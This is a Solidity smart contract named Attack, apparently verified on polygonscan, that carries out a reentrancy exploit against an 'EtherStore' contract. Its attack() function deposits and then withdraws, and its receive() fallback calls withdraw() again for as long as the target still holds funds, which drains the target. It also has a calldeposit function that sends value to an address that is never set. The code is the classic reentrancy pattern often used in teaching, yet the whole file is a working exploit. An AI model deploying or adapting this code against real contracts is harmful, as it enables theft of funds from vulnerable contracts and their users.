/**
 *Submitted for verification at polygonscan.com on 2022-11-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface EtherStore {
    function deposit() external payable;
    function withdraw() external;
}

contract Attack {
    EtherStore  public  etherStore;
    address payable AddressH;

    constructor(address payable _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }
   
    function deposit() public payable {
        etherStore.deposit{value: msg.value}();
    }

    function calldeposit() public payable {
        (bool sent, ) = AddressH.call{value: msg.value, gas: 100000}("");
        require(sent, "error");
    }
    
    receive() external payable {
        if (address(etherStore).balance >= msg.value) {
            etherStore.withdraw();
        }
    }
    
    function attack() external payable {
        etherStore.deposit{value: msg.value}();
            etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}